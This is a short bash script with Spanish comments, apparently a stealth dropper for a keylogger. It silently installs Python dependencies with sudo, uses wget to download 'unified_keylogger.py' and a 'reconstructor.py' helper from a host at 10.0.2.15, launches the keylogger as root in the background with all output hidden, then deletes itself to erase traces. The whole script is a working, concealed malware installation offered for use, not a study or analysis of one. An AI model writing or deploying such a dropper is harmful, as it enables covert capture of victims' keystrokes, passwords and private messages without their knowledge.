#!/bin/bash
# stealth_install.sh - instalación y ejecución silenciosa

# función para ejecutar comandos silenciosos
silent_exec() {
    "$@" &>/dev/null
}

# instalar dependencias silenciosamente
silent_exec sudo apt update
silent_exec sudo apt install -y python3-pynput python3-requests

# descargar archivos silenciosamente
silent_exec wget http://10.0.2.15:8000/unified_keylogger.py
silent_exec wget http://10.0.2.15:8000/reconstructor.py

# ejecutar keylogger en modo stealth y segundo plano
nohup sudo python3 unified_keylogger.py --silent &>/dev/null &

# limpiar rastros
rm -f stealth_install.sh

# cerrar terminal inmediatamente
exit 0
